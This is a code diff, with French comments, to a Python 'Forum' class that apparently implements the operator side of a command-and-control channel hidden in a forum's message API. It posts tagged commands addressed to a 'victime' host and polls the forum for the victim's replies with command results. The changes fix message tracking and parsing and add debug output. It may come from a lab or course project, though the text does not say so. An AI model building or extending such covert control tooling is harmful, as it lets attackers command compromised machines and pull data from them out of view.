@@ -162,14 +162,17 @@ class Forum:
         self.find = False
         token = self.generate_user_key()
 
-        # Récupère le dernier id connu du compte émetteur (self.user),
-        #    pour éviter de reconsommer d’anciens messages
+        # CORRECTION: Récupère le dernier id de la VICTIME (pas de C2)
+        # pour ne prendre que les réponses APRÈS l'envoi de la commande
         response = requests.get(
             f"http://{self.ip}:{self.port}/api/messages",
             headers={"Authorization": f"Bearer {token}"},
         )
         messages = response.json()
-        last_id = max((m.get("id", 0) for m in messages if m.get("username") == self.user), default=0)
+        # On prend le dernier message de la victime AVANT d'envoyer la commande
+        last_victim_id = max((m.get("id", 0) for m in messages if m.get("username") == self.name), default=0)
+        
+        print(f"[DEBUG] Dernier message de {self.name} avant envoi: ID={last_victim_id}")
 
         # Envoie la commande au format taggé lisible par la victime
         #    Format: [FROM=C2];[TO=victime_2];[SEQ=42]; <commande>
@@ -179,8 +182,10 @@ class Forum:
             headers={"Authorization": f"Bearer {token}"},
             json={"body": tagged},
         )
+        
+        print(f"[DEBUG] Commande envoyée, attente de réponse avec ID > {last_victim_id}")
 
-        # Attendre une réponse de la victime (username == self.name) plus récente que last_id
+        # Attendre une réponse de la victime (username == self.name) plus récente que last_victim_id
         while not self.find:
             response = requests.get(
                 f"http://{self.ip}:{self.port}/api/messages",
@@ -188,11 +193,12 @@ class Forum:
             )
             messages = response.json()
 
+            # Chercher le message le plus récent de la victime
             for message in messages:
                 mid = message.get("id", 0)
-                if message.get("username") == self.name and mid > last_id:
+                if message.get("username") == self.name and mid > last_victim_id:
                     self.last = message.copy()
-                    print("nouveau message trouvé :", self.last)
+                    print(f"[DEBUG] Nouveau message trouvé de {self.name}: ID={mid}")
                     self.find = True
                     break
 
@@ -203,26 +209,38 @@ class Forum:
         try:
             parts = self.last['body'].split("];")
             # parts exemple:
-            # ['[FROM=C2', '[TO=victime_2', '[SEQ=42', ' commande...']
+            # ['[FROM=victime_2', '[TO=C2', '[SEQ=42', ' résultat...']
             if len(parts) < 4:
-                return None, None
+                return None
 
-            from_part = parts[0]  # "[FROM=C2"
-            to_part = parts[1]  # "[TO=victime_2"
-            seq_part = parts[2]  # "[SEQ=42"
+            from_part = parts[0]  # "[FROM=victime_2"
+            to_part = parts[1]    # "[TO=C2"
+            seq_part = parts[2]   # "[SEQ=42"
             cmd_part = "];".join(parts[3:]).strip()
 
             sender = from_part.split("=", 1)[1].rstrip("]")
             target = to_part.split("=", 1)[1].rstrip("]")
             seq = seq_part.split("=", 1)[1].rstrip("]")
 
+            print(f"[DEBUG] Message décodé: FROM={sender}, TO={target}, SEQ={seq}")
+            
+            # Vérifier que c'est bien la victime qui nous répond
             if sender != self.name or target != self.user:
-                return None, None
+                print(f"[WARN] Message ignoré: mauvais émetteur/destinataire")
+                self.num_commande += 1
+                return "pas-trouvé"
+
+            # Vérifier la séquence
+            if int(seq) != self.num_commande:
+                print(f"[WARN] Séquence incorrecte: attendu {self.num_commande}, reçu {seq}")
 
             self.num_commande += 1
             return cmd_part
-        except Exception:
-            return None, None
+            
+        except Exception as e:
+            print(f"[ERROR] Erreur lors du parsing: {e}")
+            self.num_commande += 1
+            return "problème"
 
 
 
